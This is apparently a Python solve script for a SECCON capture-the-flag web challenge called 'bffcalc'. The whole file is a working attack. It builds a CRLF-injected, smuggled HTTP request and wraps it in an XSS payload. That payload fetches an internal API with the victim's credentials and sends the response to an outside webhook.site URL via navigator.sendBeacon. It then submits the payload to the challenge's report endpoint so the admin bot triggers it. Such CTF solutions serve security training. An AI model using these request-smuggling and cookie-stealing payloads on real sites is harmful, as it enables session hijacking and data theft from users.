import requests
import html
from urllib import parse

BASE_URL = 'http://bffcalc-2.seccon.games:3000'
# BASE_URL = 'http://bffcalc.seccon.games:3000'
# BASE_URL = 'http://localhost:3000'

payload3 = '\r\n'
payload3 += 'Host: localhost\r\n'
payload3 += 'Content-Length: 1220\r\n'
payload3 += 'Content-Type: application/x-www-form-urlencoded\r\n'
payload3 += '\r\n'

payload2 = '\r\n'
payload2 += 'Host: localhost\r\n'
payload2 += 'Content-Length: 770\r\n'
payload2 += 'Content-Type: application/x-www-form-urlencoded\r\n'
payload2 += '\r\n'
payload2 += 'expr=<script>window.onload=()=>fetch("/api'+parse.quote(parse.quote(payload3))+'",{method:"POST",credentials:"include",referrerPolicy:"unsafe-url",headers:{"Accept-Language":"x"}}).then(r=>r.text().then(t=>navigator.sendBeacon("https://webhook.site/7b69fb82-b0f6-462b-8ce5-f90ce2479c98",t)))</script><div id=a>'

path = f'/api{parse.quote(payload2)}&expr='

print(path)

print('body:')
# print(requests.post(BASE_URL + path).text)

pad = 'a'*40
escaped = html.escape(f'document.cookie="hogehoge={pad};path=/";document.body.innerHTML=\'<form id="hoge" action="{path}" method="POST"></form><img src=x onerror="setTimeout(()=>window.hoge.submit(),2000)">\'')
payload = f'<img src=x onerror="{escaped}">'
data={
  'expr': payload
}
print(payload)
requests.post(BASE_URL + '/report', data=data)